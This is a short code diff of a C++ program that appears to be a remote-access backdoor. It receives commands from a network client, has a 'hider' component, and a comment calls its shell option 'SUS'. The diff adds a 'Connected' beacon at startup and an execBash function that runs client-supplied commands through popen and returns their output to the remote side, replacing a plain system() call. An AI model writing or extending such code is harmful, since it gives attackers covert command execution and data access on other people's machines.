@@ -16,6 +16,8 @@ int main(int argc, char * argv[]) {
     SoftwareManeger swm = SoftwareManeger();
     HiderManeger hiderManager = HiderManeger();
     
+    client.sendData("Connected");
+
     while (true)
     {
         loopIter(client, swm, hiderManager);
@@ -48,6 +50,20 @@ Status fileWrite(Client& client, std::string param, SoftwareManeger& swm)
     return res;
 }
 
+std::string execBash(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string result;
+    FILE* pipe = popen(cmd, "r");
+    if (!pipe) throw std::runtime_error("popen() failed!");
+
+    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
+        result += buffer.data();
+    }
+
+    pclose(pipe);
+    return result;
+}
+
 
 void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
 {
@@ -70,7 +86,7 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
         break;
 
     case RUN_BASH:
-        system(param.c_str()); // maybe we shoud abandon this option, it might be SUS
+        response = execBash(param.c_str()); // maybe we shoud abandon this option, it might be SUS
         break;
 
     case HIDER_SETUP:
